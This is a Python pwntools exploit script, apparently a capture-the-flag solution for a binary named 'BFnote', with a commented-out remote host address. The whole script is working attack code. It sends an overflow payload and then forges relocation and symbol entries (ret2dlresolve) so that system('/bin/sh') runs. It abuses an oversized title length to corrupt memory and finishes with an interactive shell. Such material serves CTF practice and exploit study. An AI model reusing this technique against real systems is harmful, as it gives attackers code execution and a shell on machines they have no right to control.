from pwn import*
p = process('./BFnote')
#p = remote('123.56.85.29',6987)
elf = ELF('BFnote')
libc = ELF('libc.so.6')
read_plt = elf.plt['read']
read_got = elf.got['read']
plt0 = elf.get_section_by_name('.plt').header.sh_addr
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr
base_stage = elf.bss() + 0x420

payload = 'U'*0x3A + p32(elf.bss()+0x420 +4)
p.sendafter('Give your description : ',payload)
#--------
fake_sym_addr = base_stage + 24 #fake_sym
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf) #alignment
fake_sym_addr = fake_sym_addr + align # 
index_dynsym = (fake_sym_addr - dynsym) / 0x10
st_name = fake_sym_addr + 0x10 - dynstr #system
fake_read_sym = flat([st_name, 0, 0, 0x12])

index_offset = base_stage + 16 - rel_plt
r_info = (index_dynsym << 8) | 0x7 
fake_read_reloc = flat([read_got, r_info])

payload = '\x00'*0x400
payload += p32(plt0)
payload += p32(index_offset)
payload += 'UUUU'
payload += p32(base_stage + 80) # binsh
payload += fake_read_reloc
payload += 'U'*align
payload += fake_read_sym
payload += 'system\x00'
payload += 'U' * (80 + 0x400-len(payload))
payload += '/bin/sh\x00'
payload += 'U'*(100 - len(payload))

p.sendafter('Give your postscript : ',payload)
p.sendlineafter('Give your notebook size : ',str(1024*130))
overflow_len = 0x216FC
p.sendlineafter('Give your title size : ',str(overflow_len))
p.sendlineafter('invalid ! please re-enter :','1')
p.sendafter('Give your title : ','U')
p.sendafter('Give your note : ','U'*4)
p.interactive()
